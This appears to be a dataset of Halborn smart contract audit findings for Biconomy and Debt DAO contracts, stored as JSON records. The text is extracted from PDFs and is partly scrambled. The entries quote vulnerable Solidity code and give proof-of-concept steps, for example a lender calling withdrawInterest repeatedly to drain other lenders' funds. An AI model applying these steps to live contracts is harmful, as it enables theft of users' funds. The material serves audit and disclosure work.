) = receiver . call { value : gasFeeAccumulated }( \" \" ); require ( success , \" Native Transfer Failed \" ); emit GasFeeWithdraw ( address ( this ) , receiver , gasFeeAccumulated ); } Recommendation: It is recommended to use: Listing 11: Recommendation 1 ( bool success , ) = receiver . send ( adminFeeAccumulated ); instead of Listing 12: Recommendation 1 ( bool success , ) = receiver . call { value : adminFeeAccumulated }( \"\" ) ; since the send() method has gas limit (2300) while call.value() method uses all remaining gas. Remediation Plan: SOLVED: Biconomy Team solved this issue by replacing the call.value() method with send() method which has gas limit. 26 ",
        "labels": [
            "Halborn",
            "Biconomy_LiquidityPoolManager",
            "Severity: Low"
        ]
    },
    {
        "title": "EXPERIMENTAL FEATURES ENABLED",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_LiquidityPoolManager_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf",
        "body": "ABIEncoderV2 is enabled and the use of experimental features could be dangerous on live deployments. The experimental ABI encoder does not handle non-integer values shorter than 32 bytes properly. This applies to bytesNN types, bool, enum and other types when they are part of an array or a struct and encoded directly from storage. This means these storage references have to be used directly inside abi.encode(...) as arguments in external function calls or in event data without prior assignment to a local variable. The types bytesNN and bool will result in corrupted data while enum might lead to an invalid revert. Risk Level: Likelihood - 1 Impact - 2 Code Location: Listing 13: LiquidityPoolManager.sol (Lines 4) 1 // SPDX - License - Identifier : MIT 2 3 pragma solidity 0.7.6; 4 pragma experimental ABIEncoderV2 ; Recommendation: When possible, do not use experimental features in the final live deployment. Validate and check that all the conditions above are true for integers and arrays (i.e. all using uint256). 27 Remediation Plan: SOLVED: Biconomy Team removed experimental keyword on pragma section. 28 ",
        "labels": [
            "Halborn",
            "Biconomy_LiquidityPoolManager",
            "Severity: Informational"
        ]
    },
    {
        "title": "POSSIBLE MISUSE OF PUBLIC FUNCTIONS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_LiquidityPoolManager_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf",
        "body": "In public functions, array arguments are immediately copied to memory, while external functions can read directly from calldata. Reading Public functions need to calldata is cheaper than memory allocation. write the arguments to memory because public functions may be called internally. Internal calls are passed internally by pointers to memory. Thus, the function expects its arguments being located in memory when the compiler generates the code for an internal function. Also, methods do not necessarily have to be public if they are only called within the contract-in such case they should be marked internal. In addition to that if a function not used in the contract second time, external keyword should be appended to the function for a better gas optimization. 29 Code Location: Misused Functions Without External Keyword: Listing 14: LiquidityPoolManager.sol 1 changeAdminFee () 2 setExecutorManager () 3 setTrustedForwarder () 4 setTokenTransferOverhead () 5 addSupportedToken () 6 removeSupportedToken () 7 updateTokenCap () 8 addNativeLiquidity () 9 removeNativeLiquidity () 10 addTokenLiquidity () 11 removeTokenLiquidity () 12 depositNative () 13 sendFundsToUser () 14 withdrawErc20 () 15 withdrawNative () Recommendation: Consider as much as possible declaring external variables instead of public variables. As for best practice, you should use external if you expect that the function will only be called externally and use public if you need to call the function internally. To sum up, all can access to public functions, external functions only can be accessed externally and internal functions can only be called within the contract. Remediation Plan: SOLVED: Biconomy Team replaced external to public in several functions. 30 ",
        "labels": [
            "Halborn",
            "Biconomy_LiquidityPoolManager",
            "Severity: Informational"
        ]
    },
    {
        "title": "MISSING EVENTS EMITTING",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_LiquidityPoolManager_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf",
        "body": "It has been observed that critical functionality is missing emitting event for setTrustedForwarder and changeAdminFee functions. These functions should emit events after completing the transactions. Risk Level: Likelihood - 1 Impact - 1 Code Location: Listing 15: LiquidityPoolManager.sol 82 83 84 85 function changeAdminFee ( uint256 newAdminFee ) public onlyOwner whenNotPaused { require ( newAdminFee != 0 , \" Admin Fee cannot be 0 \" ); adminFee = newAdminFee ; } Listing 16: LiquidityPoolManager.sol 104 function setTrustedForwarder ( address forwarderAddress ) public onlyOwner { 105 106 107 } require ( forwarderAddress != address (0) , \" Forwarder Address cannot be 0 \" ); trustedForwarder = forwarderAddress ; 31 Recommendation: Consider changeAdminFee functions. emitting an event when calling setTrustedForwarder and Listing 17 1 event changeAdminFee ( uint256 newAdminFee ); 2 event setTrustedForwarder ( address forwarderAddress ); defining AdminFeeChanged new events and Remediation Plan: SOLVED: on the TrustedForwarderChanged. Biconomy Team to contract solved notify this users issue such by as 32 ",
        "labels": [
            "Halborn",
            "Biconomy_LiquidityPoolManager",
            "Severity: Informational"
        ]
    },
    {
        "title": "LENDER LIQUIDITY LOCKOUT POSSIBLE VIA DEPOSITANDCLOSE FUNCTION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Debt_DAO_P2P_Loan_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "In the LineOfCredit contract, the borrower has two possibilities to pay off the debt: by calling depositAndRepay() and then close() functions, or by calling a single depositAndClose() function. The assessment revealed that the depositAndClose() does not transfer funds back to the lender, yet it deletes the debt record (using the internal _close function). As a result, the lenders liquidity is locked in the contract. Listing 1: LineOfCredit.sol (Line 193) 172 function depositAndClose () whileBorrowing 173 onlyBorrower 174 override external 175 176 returns ( bool ) 177 178 179 180 181 { bytes32 id = positionIds [0]; _accrueInterest ( id ); uint256 totalOwed = debts [ id ]. principal + debts [ id ].  interestAccrued ; 182 183 // borrower deposits remaining balance not already repaid and  held in contract 184 185 186 187 188 189 190 191 192 bool success = IERC20 ( debts [ id ]. token ). transferFrom ( msg . sender , address ( this ) , totalOwed ); require ( success , ' Loan : deposit failed '); // clear the debt _repay ( id , totalOwed ); 23 193 194 195 } require ( _close ( id )) ; return true ; Listing 2: LineOfCredit.sol (Line 328) 318 function close ( bytes32 positionId ) override external returns (  bool ) { 319 320 321 322 323 324 325 326 327 328 DebtPosition memory debt = debts [ positionId ]; require ( msg . sender == debt . lender || msg . sender == borrower , \" Loan : msg . sender must be the lender or borrower \" ); // return the lender 's deposit if ( debt . deposit > 0) { require ( IERC20 ( debt . token ). transfer ( debt . lender , debt .  deposit + debt . interestRepaid )) ; 329 330 331 332 333 334 } require ( _close ( positionId )) ; return true ; } Listing 3: LineOfCredit.sol (Line 470) 464 function _close ( bytes32 positionId ) virtual internal returns (  bool ) { 465 466 require ( debts [ positionId ]. principal + debts [ positionId ].  interestAccrued == 0 , 467 468 469 470 471 472 473 474 475 476 ' Loan : close failed . debt owed ' ); delete debts [ positionId ]; // yay gas refunds !!! // remove from active list positionIds = LoanLib . removePosition ( positionIds , positionId ); // brick loan contract if all positions closed if ( positionIds . length == 0) { 24 477 478 479 480 481 482 483 loanStatus = LoanLib . STATUS . REPAID ; } emit CloseDebtPosition ( positionId ); return true ; } Proof of Concept: 1. All necessary contracts are deployed and initialized: RevenueToken, SimpleOracle, LoanLib, LineOfCredit. 2. As borrower and lender add debt position. 3. As borrower, borrow all deposit. 4. As borrower call depositAndClose to pay the debt. 5. Observe that lender did not receive the liquidity. 6. As the lender attempt to call the close function. Observe that it reverts with the error (Loan: msg.sender must be the lender or borrower). 25 Risk Level: Likelihood - 5 Impact - 5 Recommendation: It is recommended to return lenders liquidity upon calling the depositAndClose() function. Remediation Plan: SOLVED: The Debt DAO team solved this issue in commit d739f19d646a2d192aae1e8f56f11e90bbc75dac: lenders liquidity now happens on _close() internal function which is called by the depositAndClose() and close() functions. transfer the of 26 ",
        "labels": [
            "Halborn",
            "Debt_DAO_P2P_Loan",
            "Severity: Critical"
        ]
    },
    {
        "title": "DEBT PAY OFF IMPOSSIBLE DUE TO INTEGER UNDERFLOW",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Debt_DAO_P2P_Loan_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "In the LineOfCredit contract, the borrower has two possibilities to pay off the debt: by calling depositAndRepay() and then close() functions, or by calling a single depositAndClose() function. The assessment revealed that both functions depositAndClose() and depositAndRepay() revert due to integer overflow. The error occurs due to principalUsd parameter subtraction done in _repay function. The principalUsd parameter is supposed to have a non-zero value; however, due to condition check in _createCredit where principal parameter is always 0, the principalUsd parameter is not updated. Listing 4: LineOfCredit.sol (Line 197) external virtual override whileActive mutualConsent ( lender , borrower ) returns ( bytes32 ) uint128 drate , uint128 frate , uint256 amount , address token , address lender ) 176 function addCredit ( 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 { lender , address ( this ) , amount bool success = IERC20 ( token ). transferFrom ( ); require ( success , \" Loan : no tokens to lend \"); bytes32 id = _createCredit ( lender , token , amount , 0) ; 27 198 199 200 201 202 require ( interestRate . setRate ( id , drate , frate )) ; return id ; } Listing 5: LineOfCredit.sol (Lines 546-549) 510 511 512 513 514 515 516 function _createCredit ( address lender , address token , uint256 amount , uint256 principal ) internal returns ( bytes32 id ) { id = LoanLib . computePositionId ( address ( this ) , lender ,  token ); 517 518  _close () 519 520 521 522 523 524 525 526 527  ); 528 529 // MUST not double add position . otherwise we can not require ( credits [ id ]. lender == address (0) , \" Loan : position exists \" ); ( bool passed , bytes memory result ) = token . call ( abi . encodeWithSignature (\" decimals () \" ) ); uint8 decimals = ! passed ? 18 : abi . decode ( result , ( uint8 ) uint256 value = LoanLib . getValuation ( oracle , token , amount  , decimals ); 530 531 532 533 534 535 536 537 538 539 540 541 require ( value > 0 , \" Loan : token cannot be valued \"); credits [ id ] = Credit ({ lender : lender , token : token , decimals : decimals , deposit : amount , principal : principal , interestAccrued : 0, interestRepaid : 0 }) ; 28 542 543 544 545 546 547 548 549 550 551 552 ids . push ( id ); // add lender to end of repayment queue emit AddCredit ( lender , token , amount , 0) ; if ( principal > 0) { principalUsd += value ; emit Borrow (id , principal , value ); } return id ; } Listing 6: LineOfCredit.sol (Line 587) 562 563 564 565 566 567 568 569 570 571 function _repay ( bytes32 id , uint256 amount ) internal returns ( bool ) { Credit memory credit = credits [ id ]; int price = oracle . getLatestAnswer ( credit . token ); if ( amount <= credit . interestAccrued ) { credit . interestAccrued -= amount ; uint256 val = LoanLib . calculateValue ( price , amount ,  credit . decimals ); 572 573 574 575 576 577 interestUsd -= val ; credit . interestRepaid += amount ; emit RepayInterest ( id , amount , val ); } else { uint256 principalPayment = amount - credit .  interestAccrued ; 578 579 uint256 iVal = LoanLib . calculateValue ( price , credit .  interestAccrued , credit . decimals ); 580 uint256 pVal = LoanLib . calculateValue ( price ,  principalPayment , credit . decimals ); 581 582 583 584 585 586 587 emit RepayInterest ( id , credit . interestAccrued , iVal ); emit RepayPrincipal ( id , principalPayment , pVal ); // update global credit denominated in usd interestUsd -= iVal ; principalUsd -= pVal ; 29 588 589  token 590 591 592 593 594 // update individual credit position denominated in credit . principal -= principalPayment ; credit . interestRepaid += credit . interestAccrued ; credit . interestAccrued = 0; // if credit fully repaid then remove lender from  repayment queue 595 596 597 598 599 600 601 if ( credit . principal == 0) ids = LoanLib . stepQ ( ids ); } credits [ id ] = credit ; return true ; } Proof of Concept: 1. All necessary contracts are deployed and initialized: RevenueToken, SimpleOracle, LoanLib, LineOfCredit. 2. As the borrower and lender, add credit position, 3. As the borrower, borrow() all deposits. 4. As the borrower, attempt to call depositAndClose to pay the debt. 5. Observe that transaction reverts due to integer overflow. 6. As the borrower, attempt to call depositAndRepay to pay the debt. 7. Observe that transaction reverts due to integer overflow. 30 Risk Level: Likelihood - 5 Impact - 5 Recommendation: It is recommended to review and adjust the calculations related to the principalUsd parameter. Remediation Plan: SOLVED: The Debt DAO team solved this issue in commit 51dab65755c9978333b147f99db007a93bd0f81c: the principalUsd parameter and related calculations are now removed. 31 ",
        "labels": [
            "Halborn",
            "Debt_DAO_P2P_Loan",
            "Severity: Critical"
        ]
    },
    {
        "title": "LENDER CAN WITHDRAW INTEREST MULTIPLE TIMES",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Debt_DAO_P2P_Loan_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "In the LineOfCredit contract, a lender has the possibility to withdraw accrued interest via withdrawInterest() function. The function does not record the fact of withdrawal; thus, the function can be called multiple times until the contract has a positive token balance. As a result, in the case of multiple lenders recorded in the contract, one lender can extract liquidity from other lenders. Alternatively, a lender can pull unborrowed deposits and force borrowers to pay off higher debt than expected, or force default. Listing 7: LineOfCredit.sol (Line 587) 453 454 455 456 457 458 459 460 461 462 463 464 465 466 467 468 469 470 471 472 473 474 475 476 function withdrawInterest ( bytes32 id ) external override returns ( uint256 ) { require ( msg . sender == credits [ id ]. lender , \" Loan : only lender can withdraw \" ); _accrueInterest ( id ); uint256 amount = credits [ id ]. interestAccrued ; bool success = IERC20 ( credits [ id ]. token ). transfer ( credits [ id ]. lender , amount ); require ( success , \" Loan : withdraw failed \" ); emit WithdrawProfit ( id , amount ); return amount ; } 32 Proof of Concept: As borrower, borrow 10_000_000_000_000_000 tokens from the first Scenario 1 - steal other lenders' liquidity 1. All necessary contracts are deployed and initialized: RevenueToken, SimpleOracle, LoanLib, LineOfCredit. 2. As borrower and lender1, add credit position for 10_000_000_000_000_- 000 tokens and drawn rate set to 3000. This action registers the first credit position. 3. As the borrower and the lender2, add credit position for 10_000_000_- 000_000_000 tokens and drawn rate set to 3000. This action registers the second credit position. 4. position. 5. Forward blockchain time for 20 days. 6. As the lender1, call withdrawInterest for the first credit position ten times. 7. As the borrower, call depositAndClose to pay off the debt and close the first position. 8. As the borrower, attempt to borrow 10_000_000_000_000_000 tokens from the second position. 9. Observe that transaction reverts due to ERC20: transfer amount exceeds balance error. Note that LineOfCredit balance is below 10_000_000_000_- 000_000. 33 Scenario 2 - steal borrower liquidity 1. All necessary contracts are deployed and initialized: RevenueToken, SimpleOracle, LoanLib, LineOfCredit. 2. As borrower and lender1, add credit position for 10_000_000_000_000_- 000 tokens and drawn rate set to 3000. 4. As borrower, borrow 5_000_000_000_000_000 tokens. 5. Forward blockchain time for 20 days. 6. As the lender1, call withdrawInterest ten times. 7. tokens. 8. Observe that transaction reverts due to ERC20: transfer amount exceeds balance error. Note that LineOfCredit balance is below 5_000_000_000_- As the borrower, attempt to borrow 5_000_000_000_000_000 residual 000_000. 9. As the borrower, attempt to call depositAndClose to pay off the debt. Observe that transaction reverts due to ERC20: transfer amount 10. exceeds balance error. 34 Risk Level: Likelihood - 5 Impact - 5 Recommendation: It is recommended to limit the withdrawal up to the amount of accrued interest so far and update related storage-parameters to prevent subsequent withdrawals. Remediation Plan: SOLVED: The Debt DAO team solved this issue in commit a18167d41eb4e1ccb70bbeceeef0aff1c93b05f9: function is now removed from contract. the withdrawInterest() 35 ",
        "labels": [
            "Halborn",
            "Debt_DAO_P2P_Loan",
            "Severity: Critical"
        ]
    },
    {
        "title": "ORACLE PRICE AFFECTS THE POSSIBILITY OF DEBT REPAYMENT",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Debt_DAO_P2P_Loan_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The LineOfCredit contract tracks unpaid interest valuated in USD by This parameter is updated with addition in interestUsd parameter. _accrueInterest() internal function and subtraction in _repay() internal function. The _accrueInterest() is used by accrueInterest(), setRates(), increaseCredit(), borrow(), withdraw(), and withdrawInterest() functions among the others. The _repay() is used by depositAndRepay() and depositAndClose() functions. Listing 8: LineOfCredit.sol (Line 631) 609 610 611 612 613 614 615 616 617 618 619 620 621 622 623 624 625 626 627 628 629 630 631 632 function _accrueInterest ( bytes32 id ) internal returns ( uint256 accruedToken , uint256 accruedValue ) { Credit memory credit = credits [ id ]; // get token demoninated interest accrued accruedToken = interestRate . accrueInterest ( id , credit . principal , credit . deposit ); // update credits balance credit . interestAccrued += accruedToken ; // get USD value of interest accrued accruedValue = LoanLib . getValuation ( oracle , credit . token , accruedToken , credit . decimals ); interestUsd += accruedValue ; 36 633 634 635 636 637 638 } emit InterestAccrued ( id , accruedToken , accruedValue ); credits [ id ] = credit ; // save updates to intterestAccrued return ( accruedToken , accruedValue ); Listing 9: LineOfCredit.sol (Lines 572,586) { internal returns ( bool ) 562 function _repay ( bytes32 id , uint256 amount ) 563 564 565 566 567 568 569 570 571 if ( amount <= credit . interestAccrued ) { Credit memory credit = credits [ id ]; int price = oracle . getLatestAnswer ( credit . token ); credit . interestAccrued -= amount ; uint256 val = LoanLib . calculateValue ( price , amount ,  credit . decimals ); 572 573 574 575 576 577 interestUsd -= val ; credit . interestRepaid += amount ; emit RepayInterest ( id , amount , val ); } else { uint256 principalPayment = amount - credit .  interestAccrued ; 578 579 uint256 iVal = LoanLib . calculateValue ( price , credit .  interestAccrued , credit . decimals ); 580 uint256 pVal = LoanLib . calculateValue ( price ,  principalPayment , credit . decimals ); 581 582 583 584 585 586 587 588 589  token 590 591 emit RepayInterest ( id , credit . interestAccrued , iVal ); emit RepayPrincipal ( id , principalPayment , pVal ); // update global credit denominated in usd interestUsd -= iVal ; principalUsd -= pVal ; // update individual credit position denominated in credit . principal -= principalPayment ; credit . interestRepaid += credit . interestAccrued ; 37 592 593 594 credit . interestAccrued = 0; // if credit fully repaid then remove lender from  repayment queue 595 596 597 598 599 600 601 if ( credit . principal == 0) ids = LoanLib . stepQ ( ids ); } credits [ id ] = credit ; return true ; } The value of interestUsd parameter is strongly affected by the price returned by Oracle. Thus, if the Oracle returns a higher value than previously, an integer underflow occurs in _repay() function, making debt repayment impossible. To exploit this vulnerability, _accrueInterest() must be called prior to _repay() to update interestUsd parameter. Listing 10: LoanLib.sol (Lines 40,55) - Gets total valuation for amount of tokens - Assumes oracles all return answers in USD - Does not check if price < 0. HAndled in - oracle contract specified by loan getting - token to value on oracle - token amount * @param token * @param amount * @param decimals - token decimals * @return */ - total value in usd of all tokens function getValuation ( /* * * @param oracle 36 37 * @notice 38  using given oracle . 39 * @dev  with 1 e8 decimals 40  Oracle or Loan 41  valuation 42 43 44 45 46 47 48 49 50 51 52 53 IOracle oracle , address token , uint256 amount , uint8 decimals external ) 38 returns ( uint256 ) { 54 55 56  , decimals ); } 57 return _calculateValue ( oracle . getLatestAnswer ( token ) , amount Proof of Concept: The codebase uses SimpleOracle mock for testing. Based on this contract, the ChangingOracle was prepared that mimics the price increase after ten days. Listing 11: ChangingOracle.sol (Lines 15,38,49) constructor ( address _supportedToken1 , address _supportedToken2 mapping ( address => int ) prices ; uint256 public immutable creationTime ; 1 pragma solidity 0.8.9; 2 3 import { IOracle } from \" ../ interfaces / IOracle . sol \" ; 4 import { LoanLib } from \" ../ utils / LoanLib . sol \" ; 5 6 contract ChangingOracle is IOracle { 7 8 9 10 11 12  ) { 13 14 15 16 17 18 19 20 21 22 23 24 25 26  int256 ) { function init () external returns ( bool ) { prices [ token ] = newPrice ; return true ; } } } prices [ _supportedToken1 ] = 1000 * 1 e8 ; // 1000 USD prices [ _supportedToken2 ] = 2000 * 1 e8 ; // 2000 USD creationTime = block . timestamp ; function getLatestAnswer ( address token ) external returns ( function changePrice ( address token , int newPrice ) external { 39 // mimic eip4626 // ( bool success , bytes memory result ) = token . call ( abi . // if ( success && result . length > 0) { // // // get the underlying token value ( if ERC4626 ) // NB : Share token to underlying ratio might not be token = abi . decode ( result , ( address ) ); // // } require ( prices [ token ] != 0, \" SimpleOracle : unsupported // simulate price change uint256 difference = block . timestamp - creationTime ; if ( difference > 900000) // 900000 = 10 days and 10 hours return prices [ token ] * 10001 / 10000; 27 28  encodeWithSignature (\" asset () \") ) ; 29 30 31  1:1 32 33 34  token \" ); 35 36 37 38 39 40 41 42 43  ) { 44 45 46 47 48 49 50 } return prices [ token ]; return address (0) ; } } } function healthcheck () external returns ( LoanLib . STATUS status return LoanLib . STATUS . ACTIVE ; function loan () external returns ( address ) { 1. All necessary contracts are deployed and initialized: RevenueToken, ChangingOracle, LoanLib, LineOfCredit. 2. As the borrower and lender1, add credit position for 1_000_000_- 000_000_000 tokens. 3. As the borrower, borrow 1_000_000_000_000_000 tokens. 4. Forward blockchain time for 10 days. 5. Call accrueInterest function. Note that the interestUsd parameter value is updated. 6. Forward blockchain time for 1 day. Note that after 11 days, the ChangingOracle will return higher results. 7. As the borrower, attempt to call depositAndClose. 8. Observe that transaction reverts due to integer overflow. 40 Risk Level: Likelihood - 5 Impact - 5 Recommendation: It is recommended to review and adjust the calculations related to the interestUsd parameter. Remediation Plan: SOLVED: The Debt DAO team solved this issue in commit 51dab65755c9978333b147f99db007a93bd0f81c,cbb2f0f2b68b966e95d2d64a2686de33f4c0496b: the interestUsd parameter and related calculations are now removed. 41 ",
        "labels": [
            "Halborn",
            "Debt_DAO_P2P_Loan",
            "Severity: Critical"
        ]
    },
    {
        "title": "WITHDRAWING ALL LIQUIDITY BEFORE BORROWING CAN DEADLOCK CONTRACT",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Debt_DAO_P2P_Loan_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "In the LineOfCredit contract, the lender has the possibility to withdraw all unborrowed deposit previously provided for loan through withdraw() function. The assessment revealed that withdrawal of all deposits, before the borrower borrows any amount, can deadlock the contract. The withdraw() function calls _accrueInterest() functions, so a small amount of Eventually, the borrower cant pay off facility interest is accrued. the debt, close the credit, or release the spigots. The whileBorrowing() modifier checks if any principal is borrowed; The however, whileBorrowing() modifier is used both in LineOfCredit and SpigotedLoan contracts in depositAndClose(), depositAndRepay(), claimAndRepay() and claimAndTrade() functions. interest accrued. check does not any if it is Listing 12: LineOfCredit.sol 68 69 70 71 modifier whileBorrowing () { require ( ids . length > 0 && credits [ ids [0]]. principal > 0) ; _ ; } Proof of Concept: 1. All necessary contracts are deployed and initialized: RevenueToken, SimpleOracle, LoanLib, LineOfCredit. 2. As borrower and lender1, add credit position for 1_000_000_000_- 000_000 tokens. 3. As the lender, withdraw() all deposits. 4. As the borrower, attempt to depositAndClose. Observe that the 42 transaction reverted. 5. As the borrower, attempt to close credit. Observe that the transaction reverted with Loan: close failed. credit owed error. 6. As the borrower, attempt to borrow deposit. Observe that the transaction reverted with Loan: no liquidity error. Risk Level: Likelihood - 5 Impact - 5 Recommendation: It is recommended to adjust whileBorrowing() modifier to verify if both interestAccrued and principal parameters are above 0. 43 Remediation Plan: SOLVED: The Debt DAO team solved this issue in commit b30347d17a90980aa7ca7c0ffb25067f87039c6d: the _close() internal function now checks only that the principal is not zero before closing. It does not check the interestAccrued parameter. 44 ",
        "labels": [
            "Halborn",
            "Debt_DAO_P2P_Loan",
            "Severity: Critical"
        ]
    },
    {
        "title": "SWEEP FUNCTION DOES NOT WORK FOR ARBITER",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Debt_DAO_P2P_Loan_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The SpigotedLoan contract implements a fallback mechanism to withdraw all unused funds from spigots in case of the borrower default. The sweep() function can be called to send all unused funds (based on unusedTokens collection) to the arbiter when the loan has defaulted and the status is set to INSOLVENT. However, the INSOLVENT status is never assigned to the loan in the solution, whereas the loan can have LIQUIDATABLE status assigned e.g., in healthcheck() function when the debt deadline has passed. Listing 13: SpigotedLoan.sol (Lines 261,270) 261 * @notice - sends unused tokens to borrower if repaid or  arbiter if liquidatable 262  healthy - doesnt send tokens out if loan is unpaid but 263 264 265 266 267 268 269 270 271 272 273 274 275 276 277 * @dev * @param token - token to take out - callable by anyone */ function sweep ( address token ) external returns ( uint256 ) { if ( loanStatus == LoanLib . STATUS . REPAID ) { return _sweep ( borrower , token ); } if ( loanStatus == LoanLib . STATUS . INSOLVENT ) { return _sweep ( arbiter , token ); } return 0; } function _sweep ( address to , address token ) internal returns (  uint256 x ) { 278 279 280 281 282 x = unusedTokens [ token ]; if ( token == address (0) ) { payable ( to ). transfer (x ); } else { require ( IERC20 ( token ). transfer ( to , x )) ; 45 283 284 285 } } delete unusedTokens [ token ]; As a result, all unused revenue and credit tokens stored in SpigotedLoan (unusedTokens collection) are locked in the contract. The credit token can be transferred to the lender using claimAndRepay() function, unless the spigot is still owned by the SpigotedLoan contract, and it is providing new revenue. On the other hand, the revenue token is locked permanently. Proof of Concept: 1. All necessary initialized: are CreditToken, RevenueToken, SimpleOracle, LoanLib, SpigotedLoan, SimpleRevenueContract. Set the ttl parameter to 1 day. contracts deployed and 2. As the borrower and lender1, add credit position for 10_000_000_- 000_000_000 tokens. 3. As the borrower, borrow() half of the deposit - 5_000_000_000_000_- 000. 4. As th borrower and arbiter, add new spigot with addSpigot() function and RevenueContract as input. 5. As the borrower, transfer the ownership of RevenueContract contract to the SpigotController. 6. Mint 500_000_000_000_000 revenue tokens to the RevenueContract contract to simulate token gain. 7. Forward blockchain time for 1 day and 1 second. 8. As the borrower, attempt to borrow() the remaining deposit. Observe that the transaction reverted with Loan: can't borrow error. 7. As the arbiter, call healthcheck() function. Note that the loans status changed from ACTIVE to LIQUIDATABLE. 46 8. As the arbiter, call updateOwnerSplit so 100% of revenue will go to the SpigotController contract. 9. As the arbiter, call claimRevenue() in SpigotController contract to claim revenue tokens. Note that 100% of tokens (500_000_000_000_000) are transferred to the SpigotController. 10. As the arbiter, call claimAndRepay() in SpigotedLoan contract to As trade escrowed revenue tokens and pay off part of the debt. an input, trade exchange data provide 250_000_000_000_000 revenue tokens that should be exchanged for credit tokens. the 11. Observe has revenue tokens. 750,000,000,000,000 Also, SpigotedLoan balances. contract that credit 250,000,000,000,000 250,000,000,000,000 credit tokens and Note and tokens the 47 250,000,000,000,000 revenue tokens are stored in unusedTokens collection. 12. As arbiter, call sweep() function with revenue token address as an input. Note that the function returns a 0 value. 13. As arbiter, call sweep() function with credit token address as an input. Note that the function returns a 0 value. 14. Observe that SpigotedLoan balances remain unchanged. 48 Risk Level: Likelihood - 5 Impact - 5 Recommendation: It is recommended that sweep() function checks loan status against LIQUIDATABLE value instead of INSOLVENT. Remediation Plan: SOLVED: The Debt DAO team solved this issue in commit 2f7f0b44a2d257c92d7626f14f579876c7d00fee: checks loan status against LIQUIDATABLE value. the sweep() function now 49 ",
        "labels": [
            "Halborn",
            "Debt_DAO_P2P_Loan",
            "Severity: Critical"
        ]
    },
    {
        "title": "COLLATERAL TOKENS LOCKOUT IN ESCROW",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Debt_DAO_P2P_Loan_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "In the Escrow contract, the releaseCollateral() function allows the borrower to withdraw collateral with the assumption that the remaining collateral is still above the minimum threshold. When the debt is paid off, the borrower should be allowed to withdraw all remaining collateral. However, the assessment revealed that withdraw of the remaining collateral is not possible. Listing 14: Escrow.sol (Lines 217-220) 203 204 205 206 207 208 209 function releaseCollateral ( uint256 amount , address token , address to ) external returns ( uint256 ) { require ( amount > 0, \" Escrow : amount is 0 \" ); require ( msg . sender == borrower , \" Escrow : only borrower can  call \" ); 210 211 212 213 214 215 216 217 218 219 require ( deposited [ token ]. amount >= amount , \" Escrow : insufficient balance \" ); deposited [ token ]. amount -= amount ; require ( IERC20 ( token ). transfer ( to , amount )); uint256 cratio = _getLatestCollateralRatio () ; require ( cratio >= minimumCollateralRatio , \" Escrow : cannot release collateral if cratio becomes  lower than the minimum \" 220 221 222 223 224 ); emit RemoveCollateral ( token , amount ); return cratio ; } When the last part of the collateral is released, the releaseCollateral 50 Then () function updates the deposited[token].amount with 0 value. the _getLatestCollateralRatio() returns 0 as collateralValue is also 0. Therefore, it is not possible to pass the assertion cratio >= minimumCollateralRatio as it is always false. Listing 15: Escrow.sol (Line 52) /* * 43 44  value vs loan value 45  the latest interest payable 46 47 48  ) { 49 50 51 52 53 54 55 56 } * @notice updates the cratio according to the collateral * @dev calls accrue interest on the loan contract to update * @return the updated collateral ratio in 18 decimals */ function _getLatestCollateralRatio () internal returns ( uint256 ILoan ( loan ). accrueInterest () ; uint256 debtValue = ILoan ( loan ). getOutstandingDebt () ; uint256 collateralValue = _getCollateralValue () ; if ( collateralValue == 0) return 0; if ( debtValue == 0) return MAX_INT ; return _percent ( collateralValue , debtValue , 18) ; Proof of Concept: 1. All necessary contracts are deployed and initialized: CreditToken, RevenueToken, SimpleOracle, LoanLib, EscrowedLoan. 2. As arbiter, enable the RevenueToken token as collateral. 3. As the borrower, add 200_000_000_000_000 of RevenueToken tokens as collateral. 4. As borrower and lender, add debt position. 5. As the borrower, borrow all deposits. 6. As the borrower, attempt to call releaseCollateral() to withdraw all remaining collateral. Observe that the transaction reverts with Escrow: cannot release collateral if cratio becomes lower than the minimum error. tokens are locked in the Escrow contract. Note that 200_000_000_000_000 of RevenueToken 51 Risk Level: Likelihood - 5 Impact - 5 Recommendation: It is recommended to fix the implementation of releaseCollateral() and _getLatestCollateralRatio() functions to allow the borrower to withdraw of the remaining collateral. 52 Remediation Plan: SOLVED: The Debt DAO team solved this issue in commit e97e8be0c7ecf8710a996b8f202bbd3a6bee0e2c: function now checks the loan status against REPAID value. the releaseCollateral() 53 ",
        "labels": [
            "Halborn",
            "Debt_DAO_P2P_Loan",
            "Severity: Critical"
        ]
    },
    {
        "title": "GETOUTSTANDINGDEBT FUNCTION RETURNS UNDERSTATED VALUE",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Debt_DAO_P2P_Loan_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
